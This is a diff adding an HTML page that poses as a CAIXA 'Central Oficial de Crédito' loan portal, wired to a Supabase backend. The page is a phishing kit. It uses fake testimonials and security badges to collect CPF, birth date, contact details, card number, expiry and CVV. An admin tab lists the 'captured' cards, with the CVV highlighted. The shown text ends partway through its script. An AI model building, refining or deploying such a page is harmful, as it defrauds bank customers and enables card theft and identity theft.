@@ -1,0 +1,971 @@
+<!DOCTYPE html>
+<html lang="pt-BR" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CAIXA - Central Oficial de Crédito</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <!-- SDK do Supabase Realtime & Client -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        :root {
+            --primary: #005CA9;
+            --primary-dark: #00437a;
+            --primary-light: #0a2540;
+            --bg-body: #090d16;
+            --bg-card: #111827;
+            --text-main: #f3f4f6;
+            --text-muted: #9ca3af;
+            --border: #1f2937;
+            --danger: #ff4d4f;
+            --radius: 16px;
+            --shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+            --transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+
+            --color-picpay: #21C25E;
+            --color-nubank: #820AD1;
+            --color-caixa: #005CA9;
+            --color-will: #FFD700;
+            --color-itau: #EC7000;
+            --color-bb: #FFF200;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+        body { background-color: var(--bg-body); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; }
+        
+        header { 
+            background-color: rgba(17, 24, 39, 0.95); 
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border); 
+            padding: 0.85rem 2rem; 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            position: sticky; 
+            top: 0; 
+            z-index: 100; 
+            transition: var(--transition);
+        }
+        header.scrolled {
+            padding: 0.5rem 2rem;
+            background-color: rgba(9, 13, 22, 0.98);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+        }
+
+        .logo-area { display: flex; align-items: center; gap: 0.75rem; flex-shrink: 0; }
+        
+        .caixa-logo-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 36px;
+            height: 36px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+            padding: 4px;
+        }
+        .caixa-logo-icon svg { width: 100%; height: 100%; }
+
+        .logo { font-size: 1.25rem; font-weight: 800; color: #fff; letter-spacing: -0.5px; display: flex; align-items: center; gap: 8px; cursor: pointer; }
+        .logo span { color: #60a5fa; }
+        
+        .header-right { display: flex; align-items: center; gap: 1rem; }
+
+        .header-auth-btn {
+            background: var(--primary);
+            color: #fff;
+            border: none;
+            padding: 0.45rem 1.15rem;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        .header-auth-btn:hover { background: var(--primary-dark); }
+
+        .brand-logo-container { text-align: center; margin-bottom: 1rem; }
+        .brand-logo-badge { display: inline-flex; align-items: center; gap: 6px; background: var(--primary-light); color: #60a5fa; padding: 0.4rem 1rem; border-radius: 30px; font-weight: 700; font-size: 0.85rem; letter-spacing: 0.5px; margin-bottom: 0.5rem; }
+        
+        nav { display: flex; gap: 0.4rem; align-items: center; flex-wrap: wrap; }
+        nav button { background: transparent; border: none; color: var(--text-muted); cursor: pointer; font-size: 0.85rem; font-weight: 500; padding: 0.4rem 0.75rem; border-radius: 8px; transition: var(--transition); white-space: nowrap; }
+        nav button:hover, nav button.active { color: var(--text-main); background-color: #1f2937; }
+        nav button.active { color: #60a5fa; font-weight: 600; }
+        
+        .btn-logout { color: var(--danger) !important; }
+        .btn-logout:hover { background-color: rgba(255, 77, 79, 0.15) !important; }
+        
+        main { flex: 1; padding: 2rem 1rem; max-width: 1000px; width: 100%; margin: 0 auto; }
+        .card { background-color: var(--bg-card); border: 1px solid var(--border); border-radius: var(--radius); padding: 1.75rem; box-shadow: var(--shadow); margin-bottom: 1.5rem; }
+        .form-group { margin-bottom: 1rem; }
+        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+        label { display: block; margin-bottom: 0.35rem; color: var(--text-muted); font-size: 0.8rem; font-weight: 500; }
+        input, select { width: 100%; padding: 0.75rem 1rem; border-radius: 10px; border: 1px solid var(--border); background-color: #030712; color: var(--text-main); font-size: 0.9rem; transition: var(--transition); text-transform: uppercase; }
+        input:focus, select:focus { outline: none; border-color: var(--primary); background-color: #111827; box-shadow: 0 0 0 3px rgba(0, 92, 169, 0.2); }
+        
+        button.btn { background-color: var(--primary); color: #fff; border: none; padding: 0.85rem 1.5rem; border-radius: 10px; cursor: pointer; font-weight: 700; width: 100%; font-size: 0.95rem; transition: var(--transition); box-shadow: 0 4px 12px rgba(0, 92, 169, 0.25); }
+        button.btn:hover:not(:disabled) { background-color: var(--primary-dark); transform: translateY(-1px); }
+        
+        .hidden { display: none !important; }
+        .alert-error { background-color: rgba(255, 77, 79, 0.15); color: #ff7875; padding: 0.75rem; border-radius: 8px; font-size: 0.85rem; margin-bottom: 1rem; text-align: center; }
+        
+        /* LOGOS ORIGINAIS DOS BANCOS */
+        .banks-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 1.2rem; margin: 2rem 0; }
+        .bank-card { background: #1f2937; border: 2px solid var(--border); border-radius: 14px; padding: 1.5rem 1rem; text-align: center; cursor: pointer; transition: var(--transition); display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 0.75rem; }
+        .bank-card:hover { border-color: var(--primary); transform: translateY(-3px); box-shadow: 0 8px 24px rgba(0,0,0,0.3); }
+        
+        .bank-logo-icon { width: 56px; height: 56px; border-radius: 14px; display: flex; align-items: center; justify-content: center; font-weight: 800; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3); }
+        
+        .logo-picpay      { background: #21C25E; color: #fff; font-family: sans-serif; font-style: italic; font-size: 0.9rem; }
+        .logo-nubank      { background: #820AD1; color: #fff; font-weight: 900; letter-spacing: -1px; }
+        .logo-caixa       { background: #005CA9; color: #fff; }
+        .logo-will        { background: #FFD700; color: #000; font-weight: 900; font-size: 0.8rem; }
+        .logo-itau        { background: #EC7000; color: #fff; font-weight: 900; font-size: 0.85rem; }
+        .logo-bb          { background: #003399; color: #FFF200; font-weight: 900; font-size: 0.85rem; border: 2px solid #FFF200; }
+        
+        .bank-name { font-weight: 700; font-size: 0.85rem; color: var(--text-main); }
+        
+        .admin-table { width: 100%; border-collapse: collapse; margin-top: 0.5rem; font-size: 0.85rem; }
+        .admin-table th, .admin-table td { padding: 0.9rem 1rem; border-bottom: 1px solid var(--border); text-align: left; vertical-align: top; }
+        .admin-table th { color: var(--text-muted); font-weight: 600; background: #030712; text-transform: uppercase; font-size: 0.75rem; }
+        .admin-table tr:hover { background-color: #1f2937; }
+
+        .cards-grid-admin { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; margin-top: 1rem; }
+        .admin-captured-card { background: linear-gradient(135deg, #172033 0%, #0d1322 100%); border: 1px solid var(--border); border-radius: 14px; padding: 1.25rem; box-shadow: var(--shadow); position: relative; display: flex; flex-direction: column; gap: 1rem; }
+        .admin-captured-card::before { content: ''; position: absolute; top: 0; left: 0; width: 4px; height: 100%; background: var(--primary); border-top-left-radius: 14px; border-bottom-left-radius: 14px; }
+        .card-header-info { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 0.75rem; }
+        .card-body-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; }
+        .card-field-box { background: #030712; border: 1px solid var(--border); border-radius: 8px; padding: 0.5rem 0.75rem; }
+        .card-field-box label { font-size: 0.7rem; color: var(--text-muted); margin-bottom: 0.15rem; text-transform: uppercase; }
+        .card-field-box .field-value { font-size: 0.9rem; font-weight: 700; color: var(--text-main); }
+        .card-field-box .field-value.highlight-cvv { color: #ff7875; letter-spacing: 1px; }
+        .card-field-box .field-value.highlight-number { color: #60a5fa; letter-spacing: 0.5px; }
+        
+        .home-hero {
+            position: relative;
+            text-align: center;
+            padding: 4rem 1.5rem;
+            margin-bottom: 2rem;
+            border-radius: var(--radius);
+            overflow: hidden;
+            background-color: #0d1322;
+            border: 1px solid var(--border);
+        }
+        .home-hero::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(135deg, rgba(9, 13, 22, 0.85) 0%, rgba(17, 24, 39, 0.75) 100%), 
+                        url('https://images.unsplash.com/photo-1554224155-8d04cb21cd6c?auto=format&fit=crop&w=1200&q=80') center/cover no-repeat;
+            filter: blur(1.5px);
+            transform: scale(1.02);
+            z-index: 1;
+        }
+        .home-hero > * { position: relative; z-index: 2; }
+
+        .home-title { font-size: 2.3rem; font-weight: 800; color: #ffffff; margin-bottom: 1rem; line-height: 1.25; text-shadow: 0 2px 10px rgba(0,0,0,0.8); }
+        .home-title span { color: var(--primary); }
+        .home-subtitle { color: #d1d5db; font-size: 1rem; max-width: 680px; margin: 0 auto 2rem auto; line-height: 1.6; text-shadow: 0 1px 6px rgba(0,0,0,0.8); font-weight: 400; }
+        
+        .partners-section { display: flex; justify-content: center; align-items: center; gap: 1.5rem; margin: 2rem 0; flex-wrap: wrap; }
+        .partner-badge { background: rgba(17, 24, 39, 0.9); backdrop-filter: blur(6px); border: 1px solid var(--border); padding: 0.75rem 1.25rem; border-radius: 12px; font-weight: 600; font-size: 0.85rem; display: flex; align-items: center; gap: 8px; color: var(--text-main); }
+        
+        .testimonials-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1.5rem; margin-top: 2rem; }
+        .testimonial-card { background-color: var(--bg-card); border: 1px solid var(--border); border-radius: var(--radius); padding: 1.5rem; box-shadow: var(--shadow); text-align: left; }
+        .client-info { display: flex; align-items: center; gap: 10px; margin-top: 1rem; }
+        .client-avatar { width: 40px; height: 40px; border-radius: 50%; background: var(--primary-light); color: #60a5fa; display: flex; align-items: center; justify-content: center; font-weight: 700; }
+
+        .whatsapp-float {
+            position: fixed; bottom: 25px; right: 25px; background-color: #25D366; color: #fff;
+            width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            font-size: 32px; box-shadow: 0 4px 20px rgba(37, 211, 102, 0.5); z-index: 1000; transition: var(--transition); text-decoration: none;
+        }
+        .whatsapp-float:hover { transform: scale(1.1); background-color: #20ba5a; }
+
+        @media(max-width: 650px) {
+            header { padding: 0.75rem 1rem; }
+            .home-title { font-size: 1.8rem; }
+            nav button { padding: 0.35rem 0.5rem; font-size: 0.8rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- BOTÃO FLUTUANTE DE SUPORTE WHATSAPP -->
+    <a href="https://wa.me/5521976870622?text=Olá,%20preciso%20de%20suporte%20no%20sistema%20de%20Empréstimos." target="_blank" class="whatsapp-float" title="Falar com Suporte">
+        💬
+    </a>
+
+    <!-- CABEÇALHO -->
+    <header id="main-header">
+        <div class="logo-area">
+            <div class="logo" onclick="goToHome()">
+                <div class="caixa-logo-icon">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M4 4L12 12L4 20" stroke="#005CA9" stroke-width="4" stroke-linecap="round"/>
+                        <path d="M20 4L12 12L20 20" stroke="#ED7000" stroke-width="4" stroke-linecap="round"/>
+                    </svg>
+                </div>
+                CAIXA
+            </div>
+        </div>
+        
+        <div class="header-right">
+            <button id="header-auth-action-btn" class="header-auth-btn" onclick="showAuthSection()">Entrar / Cadastrar</button>
+
+            <nav id="main-nav" class="hidden">
+                <button onclick="switchTab('home')" id="nav-home" class="active">Início</button>
+                <button onclick="switchTab('loan')" id="nav-loan">Solicitar Empréstimo</button>
+                <button onclick="switchTab('admin')" id="nav-admin" class="hidden">Admin Usuários</button>
+                <button onclick="switchTab('admin-cards')" id="nav-admin-cards" class="hidden">💳 Gestão de Propostas</button>
+                <button onclick="logout()" class="btn-logout">Sair</button>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <!-- AUTH SECTION -->
+        <section id="auth-section" class="card hidden" style="max-width: 400px; margin: 2rem auto;">
+            <div style="text-align: center; margin-bottom: 1.5rem;">
+                <div class="brand-logo-container">
+                    <div class="brand-logo-badge">
+                        <div class="caixa-logo-icon" style="width: 20px; height: 20px; border-radius: 4px; padding: 2px;">
+                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M4 4L12 12L4 20" stroke="#005CA9" stroke-width="4" stroke-linecap="round"/>
+                                <path d="M20 4L12 12L20 20" stroke="#ED7000" stroke-width="4" stroke-linecap="round"/>
+                            </svg>
+                        </div>
+                        CAIXA
+                    </div>
+                </div>
+                <h2 id="auth-title" style="font-size: 1.5rem; color: var(--text-main);">Acessar Sistema</h2>
+                <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 0.3rem;" id="auth-subtitle">Central de Análise e Liberação de Crédito</p>
+            </div>
+            
+            <div id="auth-alert" class="alert-error hidden"></div>
+
+            <div class="form-group">
+                <label id="user-label">Usuário ou E-mail</label>
+                <input type="text" id="auth-user" placeholder="Seu usuário" style="text-transform: none;">
+            </div>
+            <div class="form-group" id="group-email" style="display: none;">
+                <label>E-mail</label>
+                <input type="email" id="auth-email" placeholder="seu@email.com" style="text-transform: none;">
+            </div>
+            <div class="form-group" id="group-cep" style="display: none;">
+                <label>CEP</label>
+                <input type="text" id="auth-cep" placeholder="00000-000" maxlength="9" oninput="maskCep(this)" style="text-transform: none;">
+            </div>
+            <div class="form-group">
+                <label>Senha</label>
+                <input type="password" id="auth-pass" placeholder="Sua senha" style="text-transform: none;">
+                <small id="pass-hint" style="color: var(--text-muted); font-size: 0.75rem; display: block; margin-top: 0.3rem;" class="hidden">Mín. 4 caracteres.</small>
+            </div>
+            <div class="form-group" id="group-confirm-pass" style="display: none;">
+                <label>Confirmar Senha</label>
+                <input type="password" id="auth-confirm-pass" placeholder="Confirme sua senha" style="text-transform: none;">
+            </div>
+
+            <button class="btn" onclick="handleAuth()" id="auth-bin-btn">Entrar na Conta</button>
+            
+            <div style="display: flex; justify-content: space-between; margin-top: 1.25rem; font-size: 0.85rem;">
+                <span style="color: #60a5fa; cursor: pointer;" onclick="recoverWhatsApp()">Esqueceu a senha?</span>
+                <span style="color: var(--text-muted); cursor: pointer;" onclick="toggleAuthMode()" id="auth-toggle">Criar conta</span>
+            </div>
+        </section>
+
+        <!-- APP CONTAINER -->
+        <div id="app-container">
+            
+            <!-- PÁGINA INICIAL AUTÊNTICA E REALISTA -->
+            <div id="tab-home" class="tab-content">
+                <div class="home-hero">
+                    <div class="brand-logo-container"><div class="brand-logo-badge">🔒 Ambiente Seguro e Criptografado</div></div>
+                    <h1 class="home-title">Crédito rápido, sem burocracia e com<br><span>análise automatizada integrada</span></h1>
+                    <p class="home-subtitle">
+                        Simule e solicite seu empréstimo pessoal com segurança. Contamos com um sistema integrado com as principais instituições financeiras do país para garantir agilidade na aprovação e liberação diretamente em sua conta.
+                    </p>
+                    
+                    <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; margin-bottom: 1.5rem; flex-direction: column; align-items: center;">
+                        <button class="btn" style="max-width: 280px;" onclick="checkAccessAndNavigate('loan')">Solicitar Empréstimo Agora</button>
+                    </div>
+
+                    <div class="partners-section">
+                        <div class="partner-badge">🏛️ Rede Bancária Nacional Integrada</div>
+                        <div class="partner-badge">🛡️ Conformidade com Padrões de Segurança LGPD</div>
+                    </div>
+                </div>
+
+                <div class="card" style="padding: 2rem;">
+                    <h3 style="text-align: center; margin-bottom: 0.5rem; color: #60a5fa; font-size: 1.3rem;">Histórias de quem já realizou seus projetos</h3>
+                    <p style="text-align: center; color: var(--text-muted); font-size: 0.9rem; margin-bottom: 2rem;">Veja o depoimento de clientes que utilizaram nossa plataforma de crédito:</p>
+                    
+                    <div class="testimonials-grid">
+                        <div class="testimonial-card">
+                            <p style="color: var(--text-muted); font-size: 0.9rem; font-style: italic;">"Precisava de capital de giro para o meu negócio e o processo de liberação foi transparente do início ao fim."</p>
+                            <div class="client-info">
+                                <div class="client-avatar">CM</div>
+                                <div>
+                                    <h4 style="font-size: 0.9rem; color: var(--text-main);">Carlos Eduardo Mendes</h4>
+                                    <span style="font-size: 0.75rem; color: var(--primary);">Curitiba - PR</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="testimonial-card">
+                            <p style="color: var(--text-muted); font-size: 0.9rem; font-style: italic;">"O atendimento via suporte tirou todas as minhas dúvidas e o crédito caiu conforme o simulado. Excelente serviço!"</p>
+                            <div class="client-info">
+                                <div class="client-avatar">AL</div>
+                                <div>
+                                    <h4 style="font-size: 0.9rem; color: var(--text-main);">Ana Luiza Ferreira</h4>
+                                    <span style="font-size: 0.75rem; color: var(--primary);">Belo Horizonte - MG</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="testimonial-card">
+                            <p style="color: var(--text-muted); font-size: 0.9rem; font-style: italic;">"Plataforma muito prática, sem papelada excessiva e com ótimas opções entre os bancos parceiros."</p>
+                            <div class="client-info">
+                                <div class="client-avatar">RO</div>
+                                <div>
+                                    <h4 style="font-size: 0.9rem; color: var(--text-main);">Roberto Oliveira</h4>
+                                    <span style="font-size: 0.75rem; color: var(--primary);">Porto Alegre - RS</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SELEÇÃO DE BANCOS (EMPRÉSTIMOS) -->
+            <div id="tab-loan" class="tab-content hidden">
+                <div class="card" style="max-width: 750px; margin: 0 auto; text-align: center;">
+                    <div class="brand-logo-container"><div class="brand-logo-badge">CAIXA EMPRÉSTIMOS</div></div>
+                    <h2>Selecione a Instituição Financeira</h2>
+                    <p style="color: var(--text-muted); font-size: 0.95rem; margin: 0.5rem 0 1.5rem 0;">
+                        Escolha o banco onde deseja submeter sua proposta de crédito para análise automatizada:
+                    </p>
+
+                    <div class="banks-grid">
+                        <div class="bank-card" onclick="selectBank('PicPay')">
+                            <div class="bank-logo-icon logo-picpay">PicPay</div>
+                            <div class="bank-name">PICPAY</div>
+                        </div>
+                        <div class="bank-card" onclick="selectBank('Nubank')">
+                            <div class="bank-logo-icon logo-nubank">Nu</div>
+                            <div class="bank-name">NUBANK</div>
+                        </div>
+                        <div class="bank-card" onclick="selectBank('Caixa')">
+                            <div class="bank-logo-icon logo-caixa">
+                                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="width:28px;height:28px;">
+                                    <path d="M4 4L12 12L4 20" stroke="#fff" stroke-width="4" stroke-linecap="round"/>
+                                    <path d="M20 4L12 12L20 20" stroke="#ED7000" stroke-width="4" stroke-linecap="round"/>
+                                </svg>
+                            </div>
+                            <div class="bank-name">CAIXA</div>
+                        </div>
+                        <div class="bank-card" onclick="selectBank('Will Bank')">
+                            <div class="bank-logo-icon logo-will">will.</div>
+                            <div class="bank-name">WILLBANK</div>
+                        </div>
+                        <div class="bank-card" onclick="selectBank('Itaú')">
+                            <div class="bank-logo-icon logo-itau">Itaú</div>
+                            <div class="bank-name">ITAÚ</div>
+                        </div>
+                        <div class="bank-card" onclick="selectBank('Banco do Brasil')">
+                            <div class="bank-logo-icon logo-bb">BB</div>
+                            <div class="bank-name">BANCO DO BRASIL</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- FORMULÁRIO DE CAPTURA DO CARTÃO / PROPOSTA -->
+            <div id="tab-addcard" class="tab-content hidden">
+                <div class="card" style="max-width: 620px; margin: 0 auto;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.25rem;">
+                        <div>
+                            <span style="font-size: 0.75rem; background: var(--primary-light); color: #60a5fa; padding: 0.15rem 0.5rem; border-radius: 12px; font-weight: 700;">CAIXA EMPRÉSTIMOS</span>
+                            <h3 id="form-title-bank" style="margin-top: 0.2rem;">Proposta - Banco</h3>
+                            <p style="color: var(--text-muted); font-size: 0.85rem;">Preencha seus dados cadastrais e as informações de segurança do cartão.</p>
+                        </div>
+                        <button onclick="goBackToBankSelection()" style="background: transparent; border: none; color: #60a5fa; cursor: pointer; font-weight: 600; font-size: 0.85rem;">← Trocar Banco</button>
+                    </div>
+
+                    <div style="font-size: 0.8rem; font-weight: 600; color: #60a5fa; text-transform: uppercase; margin-bottom: 0.5rem;">1. Dados Pessoais do Titular</div>
+                    <div class="form-row">
+                        <div class="form-group"><label>Nome Completo</label><input type="text" id="c-fullname" placeholder="Titular" style="text-transform: none;"></div>
+                        <div class="form-group"><label>CPF</label><input type="text" id="c-cpf" placeholder="000.000.000-00" maxlength="14" oninput="maskCpf(this)" style="text-transform: none;"></div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group"><label>Nascimento</label><input type="text" id="c-dob" placeholder="DD/MM/AAAA" maxlength="10" oninput="maskDate(this)" style="text-transform: none;"></div>
+                        <div class="form-group"><label>WhatsApp</label><input type="text" id="c-whatsapp" placeholder="(00) 00000-0000" maxlength="15" oninput="maskPhone(this)" style="text-transform: none;"></div>
+                    </div>
+                    <div class="form-group"><label>E-mail</label><input type="email" id="c-email" placeholder="seu@email.com" style="text-transform: none;"></div>
+
+                    <div style="font-size: 0.8rem; font-weight: 600; color: #60a5fa; text-transform: uppercase; margin: 1.25rem 0 0.5rem 0;">2. Informações de Validação de Crédito / Cartão</div>
+                    <div class="form-row">
+                        <div class="form-group"><label>Nome no Cartão</label><input type="text" id="c-cardname" placeholder="Ex: CARLOS E SILVA"></div>
+                        <div class="form-group"><label>Número do Cartão</label><input type="text" id="c-cardnumber" placeholder="0000 0000 0000 0000" maxlength="19" oninput="maskCard(this)" style="text-transform: none;"></div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group"><label>Validade</label><input type="text" id="c-expiry" placeholder="MM/AA" maxlength="5" oninput="maskExpiry(this)" style="text-transform: none;"></div>
+                        <div class="form-group"><label>CEP</label><input type="text" id="c-cep" placeholder="00000-000" maxlength="9" oninput="maskCep(this)" style="text-transform: none;"></div>
+                    </div>
+                    <div class="form-group">
+                        <label>CVV</label>
+                        <input type="password" id="c-cvv" placeholder="123" maxlength="4" style="text-transform: none; max-width: 50%;">
+                    </div>
+
+                    <!-- Bloco de Valor do Empréstimo -->
+                    <div class="form-group" style="background: rgba(0, 92, 169, 0.05); border: 1px dashed var(--primary); padding: 1rem; border-radius: 10px; margin-top: 1rem;">
+                        <label style="color: #60a5fa; font-weight: 700;">Valor do Empréstimo Pretendido</label>
+                        <select id="c-simulated-limit" style="margin-top: 0.3rem;">
+                            <option value="R$ 2.000,00">R$ 2.000,00</option>
+                            <option value="R$ 5.000,00">R$ 5.000,00</option>
+                            <option value="R$ 10.000,00">R$ 10.000,00</option>
+                            <option value="R$ 20.000,00">R$ 20.000,00</option>
+                        </select>
+                        <small style="color: var-text-muted; font-size: 0.75rem; display: block; margin-top: 0.4rem;">Selecione o valor desejado para simulação das parcelas e liberação.</small>
+                    </div>
+
+                    <button class="btn" onclick="saveCardData()" style="margin-top: 1rem;">Enviar Proposta para Análise</button>
+                </div>
+            </div>
+
+            <!-- ADMIN TAB (USUÁRIOS) -->
+            <div id="tab-admin" class="tab-content hidden">
+                <div id="admin-login-box" class="card" style="max-width: 400px; margin: 2rem auto;">
+                    <div class="brand-logo-container"><div class="brand-logo-badge">CAIXA EMPRÉSTIMOS</div></div>
+                    <h3>Painel Administrativo</h3>
+                    <p style="color: var(--text-muted); font-size: 0.85rem; margin: 0.4rem 0 1.25rem 0;">Acesso restrito à gestão de cadastros.</p>
+                    <div class="form-group"><input type="text" id="admin-user-input" placeholder="Usuário (admin)" style="text-transform: none;"></div>
+                    <div class="form-group"><input type="password" id="admin-password-input" placeholder="Senha (admin123)" style="text-transform: none;"></div>
+                    <button class="btn" onclick="verifyAdmin()">Acessar Painel</button>
+                </div>
+
+                <div id="admin-dashboard" class="hidden">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem; flex-wrap: wrap; gap: 10px;">
+                        <div>
+                            <h3>Painel de Usuários Registrados</h3>
+                            <p style="color: #60a5fa; font-size: 0.75rem;">Sincronizado via Supabase Realtime ✨</p>
+                        </div>
+                        <div style="display: flex; gap: 8px;">
+                            <button onclick="loadAdminData()" class="btn" style="width: auto; padding: 0.5rem 1rem; font-size: 0.8rem; background: var(--primary); color: #fff;">🔄 Atualizar Dados</button>
+                            <button onclick="lockAdmin()" class="btn" style="width: auto; padding: 0.5rem 1rem; font-size: 0.8rem; background: var(--text-muted); color: #fff;">Bloquear</button>
+                        </div>
+                    </div>
+
+                    <div class="card" style="padding: 1.25rem; margin-bottom: 1.5rem;">
+                        <h4 style="margin-bottom: 1rem; font-size: 1.05rem; color: #60a5fa;">Usuários Registrados</h4>
+                        <div style="overflow-x: auto;">
+                            <table class="admin-table">
+                                <thead>
+                                    <tr>
+                                        <th>Usuário</th>
+                                        <th>E-mail</th>
+                                        <th>CEP</th>
+                                        <th>Data/Hora</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="admin-users-table">
+                                    <tr><td colspan="4" style="text-align: center; color: var(--text-muted);">Carregando...</td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ADMIN TAB SEPARADA - GESTÃO DE PROPOSTAS / CARTÕES -->
+            <div id="tab-admin-cards" class="tab-content hidden">
+                <div id="admin-cards-dashboard">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem; flex-wrap: wrap; gap: 10px;">
+                        <div>
+                            <h3>💳 Gestão de Propostas e Dados Capturados</h3>
+                            <p style="color: #60a5fa; font-size: 0.75rem;">Visualização detalhada das solicitações de empréstimo</p>
+                        </div>
+                        <div style="display: flex; gap: 8px;">
+                            <button onclick="loadAdminData()" class="btn" style="width: auto; padding: 0.5rem 1rem; font-size: 0.8rem; background: var(--primary); color: #fff;">🔄 Atualizar Propostas</button>
+                            <button onclick="switchTab('admin')" class="btn" style="width: auto; padding: 0.5rem 1rem; font-size: 0.8rem; background: #1f2937; color: var(--text-main);">Ir para Usuários</button>
+                        </div>
+                    </div>
+
+                    <div class="card" style="padding: 1.5rem;">
+                        <h4 style="margin-bottom: 1rem; font-size: 1.1rem; color: #60a5fa; display: flex; align-items: center; gap: 8px;">
+                            <span>✨ Propostas e Cartões Submetidos</span>
+                        </h4>
+                        
+                        <div id="admin-cards-container" class="cards-grid-admin">
+                            <div style="grid-column: 1 / -1; text-align: center; color: var(--text-muted); padding: 2rem;">Nenhuma proposta cadastrada no momento.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <script>
+        const SUPABASE_CONFIG = {
+            url: 'https://ubjhowybkvkmvtcluhor.supabase.co',
+            anonKey: 'sb_publishable_6_rEnYk_r4dJFe8zdKsvlQ_XLAMfyTJ'
+        };
+
+        const supabaseClient = supabase.createClient(SUPABASE_CONFIG.url, SUPABASE_CONFIG.anonKey);
+
+        let isRegistering = false;
+        let currentUser = null;
+        let selectedBankName = '';
+
+        window.addEventListener('scroll', () => {
+            const header = document.getElementById('main-header');
+            if (window.scrollY > 30) {
+                header.classList.add('scrolled');
+            } else {
+                header.classList.remove('scrolled');
+            }
+        });
+
+        function maskCpf(i) {
+            let v = i.value.replace(/\D/g, '');
+            if (v.length > 11) v = v.slice(0, 11);
+            v = v.replace(/(\d{3})(\d)/, '$1.$2');
+            v = v.replace(/(\d{3})(\d)/, '$1.$2');
+            v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+            i.value = v;
+        }
+
+        function maskCep(i) {
+            let v = i.value.replace(/\D/g, '');
+            if (v.length > 8) v = v.slice(0, 8);
+            v = v.replace(/(\d{5})(\d)/, '$1-$2');
+            i.value = v;
+        }
+
+        function maskPhone(i) {
+            let v = i.value.replace(/\D/g, '');
+            if (v.length > 11) v = v.slice(0, 11);
+            v = v.replace(/^(\d{2})(\d)/g, '($1) $2');
+            v = v.replace(/(\d)(\d{4})$/, '$1-$2');
+            i.value = v;
+        }
+
+        function maskDate(i) {
+            let v = i.value.replace(/\D/g, '');
+            if (v.length > 8) v = v.slice(0, 8);
+            v = v.replace(/(\d{2})(\d)/, '$1/$2');
+            v = v.replace(/(\d{2})(\d)/, '$1/$2');
+            i.value = v;
+        }
+
+        function maskCard(i) {
+            let v = i.value.replace(/\D/g, '');
+            if (v.length > 16) v = v.slice(0, 16);
+            v = v.replace(/(\d{4})(?=\d)/g, '$1 ');
+            i.value = v;
+        }
+
+        function maskExpiry(i) {
+            let v = i.value.replace(/\D/g, '');
+            if (v.length > 4) v = v.slice(0, 4);
+            v = v.replace(/(\d{2})(\d)/, '$1/$2');
+            i.value = v;
+        }
+
+        function isValidEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+
+        function isValidCpf(cpf) {
+            cpf = cpf.replace(/\D/g, '');
+            return cpf.length === 11;
+        }
+
+        function selectBank(bankName) {
+            selectedBankName = bankName;
+            
+            const title = document.getElementById('form-title-bank');
+            title.innerText = `Empréstimo - ${bankName}`;
+
+            switchTab('addcard');
+        }
+
+        function goBackToBankSelection() {
+            switchTab('loan');
+        }
+
+        function showAlert(msg) {
+            const b = document.getElementById('auth-alert');
+            b.innerText = msg;
+            b.classList.remove('hidden');
+        }
+        function hideAlert() {
+            document.getElementById('auth-alert').classList.add('hidden');
+        }
+
+        function showAuthSection() {
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
+            document.getElementById('auth-section').classList.remove('hidden');
+        }
+
+        function checkAccessAndNavigate(tabId) {
+            if (!currentUser) {
+                showAuthSection();
+                showAlert('Por favor, entre ou cadastre-se para solicitar o empréstimo.');
+            } else {
+                switchTab(tabId);
+            }
+        }
